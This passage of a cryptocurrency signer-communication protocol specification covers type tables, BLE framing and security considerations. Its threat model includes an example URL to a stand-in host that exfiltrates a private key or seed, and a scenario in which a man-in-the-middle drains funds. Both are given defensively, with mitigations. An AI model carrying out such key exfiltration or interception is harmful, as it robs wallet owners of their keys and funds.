|            |                    | `0xA0 (160)` | **Missing Allowed Credentials** | No credentials provided for signing.                                                |
|            |                    | `0xA1 (161)` | **Unknown Connection**          | The `connectionId` is invalid or expired.                                           |
|            |                    | `0xA2 (162)` | **Unknown Credential**          | The requested `credId` was not found.                                               |
|            |                    | `0xA3 (163)` | **Mismatch Origin**             | The origin provided in `clientData` does not match the transport source.            |

##### 3.9.1. Other Types

| Type | Size | Standard                                          | Description                    |
|:-----|:-----|:--------------------------------------------------|:-------------------------------|
| `ID` | 16   | UUID IETF variant (variant 2) V4 IETF, BLOB(CBOR) | Universally Unique Identifier. |

##### 3.9.2. COSE Definitions

##### 3.9.2.1. COSE Key Structure

A CBOR map conforming to [COSE (RFC 8152)][rfc8152] standards. Used for `exchangeKey` and credential `payload`.

| Key  | Name    | Description                                            |
|:-----|:--------|:-------------------------------------------------------|
| `1`  | **kty** | Key Type (`1` = OKP, `2` = EC2).                       |
| `-1` | **crv** | Curve (e.g. `1` = P-256, `6` = Ed25519).               |
| `-2` | **x**   | X Coordinate / Public Key bytes.                       |
| `-3` | **y**   | Y Coordinate bytes (optional, EC2 only).               |
| `-4` | **d**   | Private Key bytes (optional, for private key export).  |
| `3`  | **alg** | Algorithm (optional).                                  |
| `2`  | **kid** | Key ID (optional).                                     |

##### 3.9.2.2. Supported Signing Algorithms (COSE)

| COSE ID | Algorithm | Description          |
|:--------|:----------|:---------------------|
| `-7`    | ES256     | ECDSA with P-256     |
| `-47`   | ES256K    | ECDSA with secp256k1 |
| `-8`    | EdDSA     | Ed25519              |

##### 3.9.3. Supported Representations

The `fmt` field in the `challenge` object hints at how the `payload` should be interpreted or
displayed to the user.

| ID         | Name   | Description                                    |
|:-----------|:-------|:-----------------------------------------------|
| 0x00 (`0`) | hex    | The payload is a hexadecimal string (default). |
| 0x01 (`1`) | utf-8  | The payload is a UTF-8 string.                 |
| 0x02 (`2`) | base64 | The payload is a Base64 encoded string.        |

##### 3.9.4. Supported Connection Types

| ID         | Type             | Description                                                                                       |
|:-----------|:-----------------|:--------------------------------------------------------------------------------------------------|
| 0x00 (`0`) | `platform`       | Connection established within the same device (e.g., via Android Intent or iOS Action Extension). |
| 0x01 (`1`) | `cross-platform` | Connection established between two different devices (e.g., via QR code bridge).                  |

##### 3.9.5. Supported Transport Types

| ID         | Type       | Description                             |
|:-----------|:-----------|:----------------------------------------|
| 0x00 (`0`) | `internal` | Internal or OS-based IPC (Intent, XPC). |
| 0x01 (`1`) | `usb`      | USB connection.                         |
| 0x02 (`2`) | `nfc`      | NFC connection.                         |
| 0x03 (`3`) | `ble`      | Bluetooth Low Energy connection.        |

##### 3.9.6. Supported Key Exchange Algorithms

| ID    | Algorithm        | Description                                                |
|:------|:-----------------|:-----------------------------------------------------------|
| `-25` | ECDH-ES-HKDF-256 | Elliptic Curve Diffie-Hellman Ephemeral Static (COSE -25). |

##### 3.9.7. Supported Encryption Algorithms

| ID  | Algorithm | Description                   |
|:----|:----------|:------------------------------|
| `3` | A256GCM   | AES-GCM 256-bit key (COSE 3). |

##### 3.9.8. Supported Credential Types

| ID         | Type          | Description                                                    |
|:-----------|:--------------|:---------------------------------------------------------------|
| 0x00 (`0`) | `public-key`  | A public key credential derived from a key pair.               |
| 0x01 (`1`) | `private-key` | A private key credential (used for import/export operations).  |
| 0x02 (`2`) | `mnemonic`    | A mnemonic phrase credential (used for import operations).     |

##### 3.9.9. Supported Transform Algorithms

The `transform` field in the `challenge` object specifies a sequence of hashing algorithms to be
applied to the `payload` (raw data) before signing.

| COSE ID | Algorithm               |
|:--------|:------------------------|
| `-16`   | SHA-256                 |
| `-43`   | SHA-512                 |
| `-100`  | SHA-512/256 (Truncated) |
| `-101`  | Keccak-256              |
| `-102`  | SHA3-256                |
| `-103`  | RIPEMD-160              |
| `-104`  | BLAKE2b-224             |
| `-105`  | BLAKE2b-256             |

##### 3.9.10. Supported Origin Schemes

For `origin` field in Party data (Web contexts).

| Scheme  | Description     |
|:--------|:----------------|
| `https` | Web Application |

##### 3.9.11. Supported Mnemonic Types

For `type` field in Mnemonic Credential Parameters.

| ID         | Type     | Description                                           |
|:-----------|:---------|:------------------------------------------------------|
| 0x00 (`0`) | `bip39`  | BIP-39 mnemonic phrase (12, 15, 18, 21, or 24 words). |
| 0x01 (`1`) | `slip39` | SLIP-39 Shamir's Secret Sharing mnemonic.             |

##### 3.9.12. Supported Device Types (Scheme)

For `scheme` field in SignerData (see **3.2**).

| Value | Description                                |
|:------|:-------------------------------------------|
| `a`   | Android                                    |
| `i`   | iOS (including iPad, iPhone, WatchOS etc.) |
| `w`   | Windows                                    |
| `m`   | MacOS                                      |
| `l`   | Linux                                      |
| `ce`  | Chrome Extension                           |
| `web` | Web Application                            |

##### 3.9.13. Signer ID

For `id` field in SignerData. Simple string identifier that depends on the scheme.

- **Android**: `com.example.app`
- **iOS**: `teamID.com.example.app` or `bundleId`
- **Web**: `https://app.uniswap.org`
- **Chrome Extension**: `ExtensionID`

### 4. Transport Layer

The protocol is transport-agnostic. Platform-specific implementation guidelines for Android, iOS, Web Extensions, and cross-environment communication are documented separately in [GUIDELINES.md](GUIDELINES.md).

#### 4.1. GCIP URI Scheme

For cross-device communication initiation (e.g., via QR codes), GCIP defines a URI scheme:

```
gcip://<base64url-encoded-block>
```

Where `<base64url-encoded-block>` is the raw GCIP binary block encoded using URL-safe Base64 (RFC 4648 §5, no padding). This is typically used to encode a `gcip.exchange.request` for scanning by a Signer app, which then establishes a BLE/NFC connection for subsequent communication.

See [GUIDELINES.md](GUIDELINES.md) for platform-specific implementation details.

#### 4.2. GTP (GCIP Transport Protocol) for BLE

For constrained transports like BLE, GCIP defines a framing protocol called GTP (GCIP Transport
Protocol) to handle message fragmentation and reassembly.

##### 4.2.1. GTP Message Types

After frame reassembly, the message format is: `[Type (1 byte)] [Payload ...]`

| Type Code | Name        | Description                     |
|:----------|:------------|:--------------------------------|
| `0x01`    | `Data`      | Contains GCIP block data.       |
| `0x02`    | `Keepalive` | Connection keepalive (no data). |

##### 4.2.2. GTP Frame Layout

Frame format: `[Flags (1 byte)] [Sequence (1 byte)] [Payload ...]`

**Flags byte:**
- Bit 7: First frame of message
- Bit 6: Last frame of message
- Bits 5-0: Reserved for future use

**Framing rules:**
- Single-frame message: `first=true`, `last=true`, `sequence=0`
- Multi-frame message:
  - First frame: `first=true`, `last=false`, `sequence=0`
  - Middle frames: `first=false`, `last=false`, `sequence=1,2,3...`
  - Last frame: `first=false`, `last=true`, `sequence=N`

##### 4.2.3. MTU Handling

Frames are split based on the negotiated BLE MTU. The frame overhead is 2 bytes (flags + sequence),
so the maximum payload per frame is `MTU - 2` bytes.

### 5. Rationale

#### 5.1. Why not [WebAuthn][webauthn] / [CTAP][ctap]?

While Passkeys are a well-designed standard for authentication, they have several limitations for
cryptocurrency wallets:

* 5.1.1. **One Key Support:** 1 Passkey = 1 Public Key, for more you
  should create another one, so to cover several chains and accounts you should create hundreds of
  passkeys.
* 5.1.2. **Incompatibility with [BIP-84][bip84] and Derivation Paths:** Passkeys providers do not support Hierarchical Deterministic (HD) Wallets.
* 5.1.3. **Public Key Retrieval:** It is impossible to retrieve the public key after creation. You must store it somewhere to be able to restore the wallet address
  later.
* 5.1.4. **No Private Key Visibility:** Users cannot view their Private Key (PK) to create a paper
  backup.
* 5.1.5. **Limited Curve Support:** Many providers do not support secp256k1, which is a basic curve
  required for many blockchains.
* 5.1.6. **Inefficient On-chain Verification:** Passkeys by default sign a challenge with some
  additional data (Client Data JSON), so smart contract wallets based on passkeys often must pass
  this client JSON data on-chain, which is sub-optimal (gas expensive).
* 5.1.7. **Reliability:** Passkeys are often an additional auth level. Providers do not guarantee
  credential safety, it can be erased any time.
* 5.1.8. **Limited Signing Transparency:** Users often cannot see the actual content they are
  signing, as passkeys typically sign the data without displaying it.
* 5.1.9. **Service-Specific Binding:** Passkeys bind specific keys to specific services (
  `service1-cred1`, `service2-cred2`). GCIP employs a different model where a single credential
  source is reused across multiple services (`service1-cred1`, `service2-cred1`), which is more
  suitable for wallet interoperability.
* 5.1.10. **Protocol Rigidity:** The protocol is difficult to extend or modify, limiting the ability
  to quickly adapt to new requirements in the fast-paced blockchain ecosystem.

#### 5.2. Relation to WalletConnect

GCIP is not a replacement for WalletConnect; rather, they serve complementary roles in the
transaction flow.

* **Complementary Flow:** While DApps can connect directly to a Signer via GCIP (e.g.,
  over Deep Links or BLE), a more robust and secure architecture should involve a Wallet
  application as an intermediary layer.
* **Recommended Architecture:**
  `DApp <-> Wallet (via WalletConnect / Deep Link / JS Interface) <-> Signer (via GCIP)`.
* **Safety Layer:** Wallets play a crucial role in interpreting raw transactions, simulating
  outcomes, and performing initial safety checks.

#### 5.3. Why not JSON RPC?

We have many restrictions on data transfer within OS (e.g. Android Binder limit) and within BLE,
NFC, so we should compress our data as much possible.

#### 5.4. Security Implememntation Considerations

* **5.4.1. Signer Caller**
    * **Requirement:** The Signer App must verify the signature or operating system identity of the
      requesting Client App whenever possible.
    * **Risk:** Without verification, a malicious application could impersonate a trusted App (e.g.,
      claiming to be "Uniswap" in the `clientData`), tricking the user into signing a
      transaction for a different entity than displayed.

* **5.4.2. User Confirmation**
    * **Requirement:** Any signing operation must require explicit user confirmation (e.g., "Swipe
      to Sign") within the Signer App interface.
    * **Risk:** If the Signer App allows background or automated signing, a compromised Client App
      could drain the user's funds silently without their knowledge.

* **5.4.3. Secure Communication Channel**
    * **Requirement:** Data between applications must be transmitted securely to prevent
      Man-in-the-Middle (MitM) attacks and data sniffing.
    * **Risk:** If the channel is insecure, an attacker could intercept the `connectionId` to spoof
      future requests, or modify the transaction payload in transit (e.g., changing the destination
      address) before it reaches the Signer App.

* **5.4.4. Environment Isolation**
    * **Requirement:** The Signer App should ideally act as a cold storage facility, having no
      permissions to access the Internet or shared public storage.
    * **Risk:** If the Signer App has network access, it becomes susceptible to remote attacks,
      supply chain vulnerabilities, or data exfiltration, negating the security benefits of
      separating keys from the "hot" Client App.
* 
* **5.4.5. Transparent Signing (Anti-Blind Signing)**
    * **Requirement:** Utilizing the `transform` field is recommended to ensure the user receives
      the raw transaction payload for verification before hashing
      and signing.
    * **Risk:** "Blind Signing" — The user signs an opaque hash (e.g., `0xa3f...`) without knowing
      its contents, which effectively bypasses human verification and allows attackers to mask
      malicious transactions.

* **5.4.6. Biometric Independence**
    * **Requirement:** The Signer App must utilize an application-level encryption scheme (e.g.,
      user password, PIN, or multi-factor derivation) for the persistent storage of the Master Seed,
      rather than relying exclusively on OS-provided biometric encryption keys.
    * **Risk:** OS-level keystores (e.g., Android Keystore, iOS Secure Enclave) are frequently
      invalidated or wiped when system biometric settings change (e.g., the user adds a new
      fingerprint or resets FaceID). If the Master Seed is encrypted solely with these keys, a
      routine device setting change can lead to the permanent loss of the wallet.

* **5.4.7. Encryption & Exchange**
    * **Context:** GCIP introduces an encryption layer (`EncryptionMessage` and `exchange` method) to
      address several critical security and usability concerns:
    * **1. General Protocol Adaptability**: As a generic protocol, GCIP must function securely
      across diverse environments—ranging from strictly isolated local OS channels (Intents) to
      open, untrusted physical transports (BLE, NFC etc).
    * **2. Anti-Spoofing & "Misclick" Protection**: In some scenarios (e.g., Android App Chooser), a
      user might accidentally select a malicious app that mimics the Signer.
        * If a malicious app intercepts a `credId` or `connectionId`, it could try to abuse it. An
          encrypted session ensures that even if a wrong app is selected later or intercepts a
          message, it cannot derive the session key to decrypt the request or forge a valid
          signature request without the initial private exchange material.
    * **3. Untrusted / Interceptable Environments**: For physical or wireless transports like BLE
      and NFC, data can be sniffed or intercepted. The `exchange` mechanism allows establishing a
      shared secret (ECDH) so that subsequent communication can be encrypted. If the client wants
      `clientData` and other `connect` request fields to be encrypted as well, it should run
      `exchange` first and then run `connect` inside the encrypted session.

* **5.4.8. Request Correlation Hash**
    * For correlation and deduplication, a signer should compute `blockId` for each `gcip.request.sign` and check uniqueness across all requests:
    * `blockId` (16 bytes) = `SHA-256(GcipBlock)` (SHA-256 digest of the block).


#### 5.5. Security Issues

* **5.5.1. iOS Caller Identity (Bundle ID Unknown):**
  Unlike Android's `getCallingPackage()`, iOS Action Extensions (`NSExtensionPointIdentifier`) do
  not receive the Bundle ID of the Host Application (Client) that invoked them.
    * **Risk:** The Signer App cannot programmatically identify *which* specific application is
      currently requesting the signature. It cannot whitelist trusted apps (e.g., "Allow only
      MetaMask") or block known malicious apps based on their Bundle ID.
    * **Mitigation:** The security model relies entirely on the user's explicit action of selecting
      the Signer App from the system Share Sheet.

* **5.5.2. iOS Origin Verification (Domain Spoofing):**
  Because the Caller Identity (5.5.1) is unknown, the Signer App cannot verify if the calling
  application actually owns the URI claimed in `clientData.origin`.
    * **Risk:** A malicious iOS app could send a request claiming `origin: "https://uniswap.org"`.
      On Android, the Signer could check if the calling package has verified App Links (Universal
      Links) for that domain. On iOS, since the calling package is unknown, this check is
      impossible. The Signer cannot validate that the app has the entitlement to represent that
      website.
    * **Mitigation:** The Signer App UI must be careful not to present the `origin` as a verified
      fact on iOS. It should display it as a "claimed" origin or rely on `clientData.name`,
      emphasizing that the verification burden is on the user to ensure they are interacting with
      the correct app.

* **5.5.3. Browser Deeplink Data Leak**
    * **Risk:** Even if the Signer App has no internet permission, it temporarily holds the resolved Private Key or seed after user authentication (e.g., biometrics/passcode). A malicious Signer (or a compromised one) could launch a browser intent (`Intent.ACTION_VIEW` or `openURL`) to a controlled server, passing the sensitive data (PK/Seed) as a URL parameter (e.g., `https://evil.com/collect?key=...`). The OS doesn't block "offline" apps from launching browser intents.
    * **Mitigation:**
        * **Open Source & Audits:** The primary defense is code transparency. The Signer App should be open-source and undergo regular security audits to verify that no such exfiltration logic exists. Unlike full-featured Wallets which update frequently, Signer Apps have a minimal feature set and update rarely, making it feasible to conduct thorough security audits for every single release.
        * **User Visibility:** It is important to note that this attack cannot be conducted silently in the background. The user will see a suspicious switch to the web browser, which serves as an immediate red flag.

* **5.5.4. Connect Retranslation (Man-in-the-Middle)**
    * **Context:**
        * **iOS:** The system-controlled Action Extension dialog appears for every interaction, making unnoticed interception highly unlikely as the user explicitly selects the extension each time.
        * **Android:** The Intent Chooser allows users to select an app to handle the request. A malicious app could mimic the legitimate Signer's name and icon. If the user selects the malicious app (e.g., via "Always" or a simple misclick), the malicious app can intercept the request.
    * **Scenario (Android):**
        1. User installs Malicious Signer.
        2. User invokes Client App, which opens system picker.
        3. User misclicks Malicious Signer.
        4. Malicious Signer opens transparently, then launches real Signer.
        5. Malicious Signer proxies the connection, generating its own keys for the Client and separate keys for the Signer.
        6. Attacker drains funds after user tops up.
    * **Mitigation:**
        * **Origin Verification:** `clientData.origin` is required. The Malicious Signer cannot verify ownership of the origin because it is not the legitimate caller (or doesn't own the domain). The signature/domain verification check will fail on the real Signer side if properly implemented.
        * **Handshake Check:** This attack is only possible during the initial `exchange` or `connect` handshake. Established connections are verified by session keys.

#### 5.6. Smart Contract Wallet and EOA Wallet Support

**Smart Contract Wallets** are supported. They are precalculated and initialized with the first
blockchain interaction. This means the flow remains consistent: `Connect` -> `Calculate Address` ->
`Sign Init Transaction`. Consequently, there is no need to support different challenges for
different derivations during the `connect` request.

**EOA Wallets** are supported via `derivationPaths`.

#### 5.7. Multi-Account Derivation

**Account Discovery:** This is not a significant issue. By default, the wallet can request only the
first account. If the user creates more accounts, this can be handled via a `gcip.extend` method.
The server can track balances, allowing for automatic derivation upon restoration, or it can be
triggered by a specific user request.



### 6. Future Considerations & Open Topics

This section outlines features currently omitted from the baseline specification to maintain
simplicity, along with the strategies for introducing them if required by future transport layers.

#### 6.1. Payload Optimization: Derivation Paths

**Proposal:** Compress repeated derivation requests by vectorizing the varying suffix indices
against a shared prefix.

**Current (Explicit):**

```
[
  {
    alg: 1,
    path: [ 2147483732, 2147483648, 2147483649, 1, 0 ]
  },
  {
    alg: 1,
    path: [ 2147483732, 2147483648, 2147483649, 2, 0 ]
  },
  {
    alg: 1,
    path: [ 2147483732, 2147483648, 2147483649, 3, 0 ]
  }
]
```

**Proposed (Vectorized):**

```
{
  alg: 1,
  path: [ 2147483732, 2147483648, 2147483649 ],
  args: { 3: [ 1, 2, 3 ] }
}
```

* **Context:** Requests are currently small enough that explicit formatting serves as a useful
  fail-fast mechanism against excessive derivation requests.

* **Risk:** On constrained transports (e.g., low-throughput BLE), payload size can become a
  bottleneck.
* **Mitigation:** This optimization is reserved for specific transport profiles where bandwidth is
  the primary constraint.

#### 6.2. Key Rotation (Forward Secrecy)

GCIP supports session key rotation for forward secrecy without requiring user re-authentication. Rotation generates a **new `eid`** and **new `sessionKey`**, invalidating the old session.

##### 6.2.1. Rotation via Exchange

The Client sends `gcip.exchange.request` inside an existing encrypted session:

1. Client sends `gcip.exchange.request` with `eid` set to current session (wrapped in `EncryptionMessage` with current `sessionKey`)
2. Signer generates new `eid`, new ECDH key pair, derives new `sessionKey`
3. Signer returns `gcip.exchange.response` with new `eid` and `exchangeKey`
4. Client derives new `sessionKey` using response's `exchangeKey` and new `eid`
5. Both parties migrate to new session; old session is deleted

This method is useful for pure key rotation without executing any operation.

##### 6.2.2. Inline Rotation with Operations

For Sign, Extend, and Disconnect operations, the client MAY include an `exchangeKey` in the `EncryptionMessage` to trigger inline rotation:

1. Client includes `exchangeKey` in request's `EncryptionMessage` (see **2.2.6.3**)
2. Request is encrypted with current `sessionKey`
3. Signer processes the operation AND performs key rotation
4. Signer responds with new `eid`, new `exchangeKey`, encrypted with new `sessionKey`
5. Both parties derive new `sessionKey` and migrate to new `eid`

This method combines an operation with key rotation in a single round-trip.

##### 6.2.3. Rotation Applicability

| Operation    | Rotation Support |
|:-------------|:-----------------|
| `exchange`   | Yes (via eid in request) |
| `connect`    | No (establishes new session) |
| `extend`     | Yes (inline) |
| `sign`       | Yes (inline) |
| `disconnect` | Yes (inline) |
| `import`     | No |

##### 6.2.4. Security Considerations

* **Forward Secrecy**: Each rotation generates fresh ephemeral keys, ensuring past sessions cannot be decrypted if future keys are compromised.
* **Session Continuity**: The logical `connectionId` remains valid after rotation; only the encryption context (`eid`, `sessionKey`) changes.
* **Atomic Migration**: Both parties must atomically switch to the new session. The old `eid` becomes invalid immediately after rotation.


## Known implementation
- [GCIP KMP](https://github.com/Open-Store-Foundation/app/tree/main/lib/gcip)
- [Signer](https://github.com/Open-Store-Foundation/app/tree/main/apps/signer)
- [Wallet](https://github.com/Open-Store-Foundation/app/tree/main/apps/sample/wallet)

## Backwards Compatibility

This protocol is designed as a new standard and does not require backwards compatibility with
existing solutions, though it can exist in parallel with hardware wallet support.

## Copyright

Copyright and related rights waived via [CC0](https://creativecommons.org/publicdomain/zero/1.0/).

## References

- [WebAuthn FIDO2][webauthn]
- [COSE ID][cose-id]
- [CTAP][ctap]
- [CTAP Hybrid Transports][ctap-hybrid]
- [RFC 8949 (CBOR)][rfc8949]
- [RFC 8152 (COSE)][rfc8152]
- [RFC 6454 (Web Origin)][rfc6454]
- [RFC 5869 (HKDF)][rfc5869]
- [BIP-32 (HD Wallets)][bip32]
- [BIP-84 (Derivation Scheme)][bip84]
- [RFC 8032 (EdDSA)][rfc8032]
- [RFC 7748 (Curve25519)][rfc7748]
- [NIST SP 800-38D (AES-GCM)][nist-sp-800-38d]

[webauthn]: https://www.w3.org/TR/webauthn-2/
[cose-id]: https://www.iana.org/assignments/cose/cose.xhtml
[ctap]: https://fidoalliance.org/specs/fido-v2.2-rd-20230321/fido-client-to-authenticator-protocol-v2.2-rd-20230321.html
[ctap-hybrid]: https://fidoalliance.org/specs/fido-v2.2-rd-20230321/fido-client-to-authenticator-protocol-v2.2-rd-20230321.html#sctn-hybrid
[rfc8949]: https://www.rfc-editor.org/rfc/rfc8949.html
[rfc8152]: https://www.rfc-editor.org/rfc/rfc8152.html
[rfc6454]: https://www.rfc-editor.org/rfc/rfc6454.html
[rfc5869]: https://www.rfc-editor.org/rfc/rfc5869.html
[bip32]: https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki
[bip84]: https://github.com/bitcoin/bips/blob/master/bip-0084.mediawiki
[rfc8032]: https://www.rfc-editor.org/rfc/rfc8032.html
[rfc7748]: https://www.rfc-editor.org/rfc/rfc7748.html
[nist-sp-800-38d]: https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf
